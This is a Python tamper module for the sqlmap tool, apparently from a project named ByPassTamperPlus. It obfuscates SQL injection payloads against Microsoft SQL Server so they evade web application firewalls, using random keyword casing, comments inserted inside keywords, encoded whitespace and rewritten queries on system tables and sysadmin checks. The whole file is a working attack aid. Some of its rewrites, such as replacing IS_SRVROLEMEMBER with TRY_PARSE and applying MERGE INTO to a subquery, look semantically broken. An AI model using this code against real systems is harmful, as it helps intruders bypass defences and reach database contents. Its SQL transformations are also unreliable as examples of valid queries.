#!/usr/bin/env python

"""
@Project  : ByPassTamperPlus
@File     : mssql_2008_bypass.py
@Author   : Tas9er / https://www.github.com/Tas9er
@IDE      : PyCharm
"""

import re
import random
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHEST

def dependencies():
    pass

def general_obfuscate(payload):
    if not payload:
        return payload

    def case_folding(match):
        word = match.group(0)
        return "".join(c.upper() if random.getrandbits(1) else c.lower() for c in word)
    
    keywords = r"\b(SELECT|FROM|WHERE|AND|OR|UNION|INSERT|UPDATE|DELETE|DROP|EXEC|DECLARE|WAITFOR|DELAY|TOP|MERGE|INTO|USING|ON|WHEN|MATCHED|THEN|TRY_PARSE|GROUPING|SETS|HIERARCHYID|CAST|AS|SYS\.TABLES|SYS\.COLUMNS|DB_NAME|USER_NAME|XP_CMDSHELL)\b"
    payload = re.sub(keywords, case_folding, payload, flags=re.IGNORECASE)

    payload = re.sub(r"(?i)\bLEN\(", "DATALENGTH(", payload)
    payload = re.sub(r"(?i)\bGETDATE\(\)", "SYSDATETIME()", payload)
    payload = re.sub(r"(?i)\bISNULL\(", "COALESCE(", payload)

    def comment_splitter(match):
        word = match.group(0)
        if len(word) > 3:
            pos = random.randint(1, len(word) - 1)
            return word[:pos] + "/*" + "".join(random.choice("abcdefghijklmnopqrstuvwxyz") for _ in range(3)) + "*/" + word[pos:]
        return word
    
    payload = re.sub(keywords, comment_splitter, payload, flags=re.IGNORECASE)

    def whitespace_replacer(match):
        choices = ["/**/", "%09", "%0a", "/**/ /*!*/ /**/"]
        return random.choice(choices)
    
    payload = re.sub(r"\s+", whitespace_replacer, payload)

    return payload

def tamper(payload, **kwargs):
    if not payload:
        return payload

    if "IS_SRVROLEMEMBER" in payload.upper():
        payload = payload.replace("IS_SRVROLEMEMBER('sysadmin')", "TRY_PARSE('sysadmin' AS sysname)")

    if "SELECT" in payload.upper() and "sys.tables" in payload.lower():
        payload = re.sub(r"(?i)SELECT\s+(.+)\s+FROM\s+sys.tables", r"MERGE INTO (SELECT TOP 1 \1 FROM sys.tables) AS t USING (SELECT \1 FROM sys.tables) AS s ON t.\1=s.\1 WHEN NOT MATCHED THEN INSERT (\1) VALUES (s.\1)", payload)

    if "GROUP BY" in payload.upper():
        payload = payload.replace("GROUP BY", "GROUP BY GROUPING SETS")

    if "SELECT" in payload.upper() and "FROM" in payload.upper() and "hierarchyid" not in payload.lower():
        payload = re.sub(r"(?i)SELECT\s+(.+)\s+FROM", r"SELECT CAST('/'+\1+'/' AS hierarchyid) FROM", payload)

    payload = general_obfuscate(payload)

    return payload
